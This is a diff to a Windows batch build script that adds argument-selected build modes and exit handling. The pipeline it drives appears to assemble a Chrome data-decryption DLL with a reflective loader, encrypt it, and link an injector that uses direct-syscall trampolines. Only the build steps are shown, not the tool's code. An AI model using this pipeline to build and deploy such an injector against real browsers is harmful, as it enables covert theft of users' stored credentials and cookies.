@@ -32,51 +32,93 @@ set "C_GRAY=%ESC%[90m"
 :: =                               ENTRY POINT                                 =
 :: =============================================================================
 
-call :main
-set "EXIT_CODE=%errorlevel%"
+:: Use a robust, linear GOTO-based flow control to avoid all parser quirks.
+if /i "%~1" == "build_encryptor_only" goto :main_build_encryptor
+if /i "%~1" == "build_target_only" goto :main_build_target
 
-if %EXIT_CODE% equ 0 (
-    call :log_info "Build successful. Final artifacts are ready."
-) else (
-    call :log_error "Build failed. Cleaning up intermediate files."
-    call :cleanup >nul 2>&1
-)
-
-endlocal
-exit /b %EXIT_CODE%
+:: Default action if no argument is provided
+goto :main_full_build
 
 
 :: =============================================================================
 :: =                              MAIN LOGIC                                   =
 :: =============================================================================
-:main
+
+:main_full_build
     call :display_banner
     call :check_environment
-    if %errorlevel% neq 0 exit /b 1
-
+    if %errorlevel% neq 0 goto :HandleExit
     call :pre_build_setup
-    if %errorlevel% neq 0 exit /b 1
-
+    if %errorlevel% neq 0 goto :HandleExit
     call :compile_sqlite
-    if %errorlevel% neq 0 exit /b 1
-
+    if %errorlevel% neq 0 goto :HandleExit
     call :compile_payload
-    if %errorlevel% neq 0 exit /b 1
-
+    if %errorlevel% neq 0 goto :HandleExit
     call :compile_encryptor
-    if %errorlevel% neq 0 exit /b 1
-
+    if %errorlevel% neq 0 goto :HandleExit
     call :encrypt_payload
-    if %errorlevel% neq 0 exit /b 1
-
+    if %errorlevel% neq 0 goto :HandleExit
     call :compile_resource
-    if %errorlevel% neq 0 exit /b 1
-
+    if %errorlevel% neq 0 goto :HandleExit
     call :compile_injector
-    if %errorlevel% neq 0 exit /b 1
-
+    if %errorlevel% neq 0 goto :HandleExit
     call :post_build_summary
-    exit /b 0
+    goto :HandleExit
+
+:main_build_encryptor
+    call :display_banner
+    call :check_environment
+    if %errorlevel% neq 0 goto :HandleExit
+    call :pre_build_setup
+    if %errorlevel% neq 0 goto :HandleExit
+    call :compile_encryptor
+    goto :HandleExit
+
+:main_build_target
+    call :display_banner
+    call :check_environment
+    if %errorlevel% neq 0 goto :HandleExit
+    call :pre_build_setup_no_clean_encryptor
+    if %errorlevel% neq 0 goto :HandleExit
+    call :compile_sqlite
+    if %errorlevel% neq 0 goto :HandleExit
+    call :compile_payload
+    if %errorlevel% neq 0 goto :HandleExit
+    call :encrypt_payload
+    if %errorlevel% neq 0 goto :HandleExit
+    call :compile_resource
+    if %errorlevel% neq 0 goto :HandleExit
+    call :compile_injector
+    if %errorlevel% neq 0 goto :HandleExit
+    call :post_build_summary
+    goto :HandleExit
+
+
+:: =============================================================================
+:: =                          EXIT HANDLING                                    =
+:: =============================================================================
+
+:HandleExit
+set "EXIT_CODE=%errorlevel%"
+if %EXIT_CODE% neq 0 (
+    call :log_error "Build failed. Cleaning up intermediate files."
+    call :cleanup >nul 2>&1
+    goto :EndScript
+)
+
+:: Success path
+if /i "%~1" == "build_encryptor_only" (
+    rem If we only built the tool, exit silently.
+    goto :EndScript
+)
+
+:: For any other successful build, print the success message.
+call :log_info "Build successful. Final artifacts are ready."
+
+:EndScript
+endlocal
+exit /b %EXIT_CODE%
+
 
 :: =============================================================================
 :: =                             BUILD SUBROUTINES                             =
@@ -102,7 +144,6 @@ goto :eof
 
 :pre_build_setup
     call :log_info "Performing pre-build setup..."
-    REM Clean up artifacts from any previous build
     call :cleanup
     call :log_info "  - Creating fresh build directory: %BUILD_DIR%"
     mkdir "%BUILD_DIR%"
@@ -110,6 +151,13 @@ goto :eof
         call :log_error "Failed to create build directory."
         exit /b 1
     )
+    call :log_success "Setup complete."
+    echo.
+goto :eof
+
+:pre_build_setup_no_clean_encryptor
+    call :log_info "Performing pre-build setup..."
+    if not exist "%BUILD_DIR%" mkdir "%BUILD_DIR%"
     call :log_success "Setup complete."
     echo.
 goto :eof
@@ -131,11 +179,9 @@ goto :eof
     set "CMD_C=cl %CFLAGS_COMMON% /c %SRC_DIR%\reflective_loader.c /Fo"%BUILD_DIR%\reflective_loader.obj""
     call :run_command "%CMD_C%" "  - Compiling C file (reflective_loader.c)..."
     if %errorlevel% neq 0 exit /b 1
-
     set "CMD_CPP=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /I%LIBS_DIR%\sqlite /c %SRC_DIR%\chrome_decrypt.cpp /Fo"%BUILD_DIR%\chrome_decrypt.obj""
     call :run_command "%CMD_CPP%" "  - Compiling C++ file (chrome_decrypt.cpp)..."
     if %errorlevel% neq 0 exit /b 1
-
     set "CMD_LINK=link /NOLOGO /DLL /OUT:"%BUILD_DIR%\%PAYLOAD_DLL_NAME%" "%BUILD_DIR%\chrome_decrypt.obj" "%BUILD_DIR%\reflective_loader.obj" "%BUILD_DIR%\sqlite3.lib" bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /IMPLIB:"%BUILD_DIR%\chrome_decrypt.lib""
     call :run_command "%CMD_LINK%" "  - Linking objects into DLL..."
     if %errorlevel% neq 0 exit /b 1
@@ -172,8 +218,6 @@ goto :eof
 
 :compile_injector
     call :log_step "[6/6] Compiling Final Injector (%FINAL_EXE_NAME%)"
-    
-    set "TRAMPOLINE_OBJ="
     if "%VSCMD_ARG_TGT_ARCH%"=="x64" (
         set "TRAMpoline_SRC=%SRC_DIR%\syscall_trampoline_x64.asm"
         set "TRAMPOLINE_OBJ=%BUILD_DIR%\syscall_trampoline_x64.obj"
@@ -186,22 +230,17 @@ goto :eof
         call :log_error "Unsupported target architecture: %VSCMD_ARG_TGT_ARCH%. Only x64 and arm64 are supported."
         exit /b 1
     )
-    
     call :run_command "!ASM_CMD!" "  - Assembling syscall trampoline (%VSCMD_ARG_TGT_ARCH%)..."
     if %errorlevel% neq 0 exit /b 1
-
     set "CMD_COMPILE_INJECTOR_SRC=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /I%LIBS_DIR%\chacha /c %SRC_DIR%\chrome_inject.cpp /Fo"%BUILD_DIR%\chrome_inject.obj""
     call :run_command "!CMD_COMPILE_INJECTOR_SRC!" "  - Compiling C++ source (chrome_inject.cpp)..."
     if %errorlevel% neq 0 exit /b 1
-    
     set "CMD_COMPILE_SYSCALLS_SRC=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /c %SRC_DIR%\syscalls.cpp /Fo"%BUILD_DIR%\syscalls.obj""
     call :run_command "!CMD_COMPILE_SYSCALLS_SRC!" "  - Compiling C++ source (syscalls.cpp)..."
     if %errorlevel% neq 0 exit /b 1
-    
-    set "CMD_LINK_FINAL=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% "%BUILD_DIR%\chrome_inject.obj" "%BUILD_DIR%\syscalls.obj" !TRAMPOLINE_OBJ! "%BUILD_DIR%\resource.res" version.lib shell32.lib %LFLAGS_COMMON% /Fe".\%FINAL_EXE_NAME%""
+    set "CMD_LINK_FINAL=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% "%BUILD_DIR%\chrome_inject.obj" "%BUILD_DIR%\syscalls.obj" !TRAMPOLINE_OBJ! "%BUILD_DIR%\resource.res" version.lib shell32.lib %LFLAGS_COMMON% /OUT:".\%FINAL_EXE_NAME%""
     call :run_command "!CMD_LINK_FINAL!" "  - Linking final executable..."
     if %errorlevel% neq 0 exit /b 1
-    
     call :log_success "Final injector built successfully."
     echo.
 goto :eof
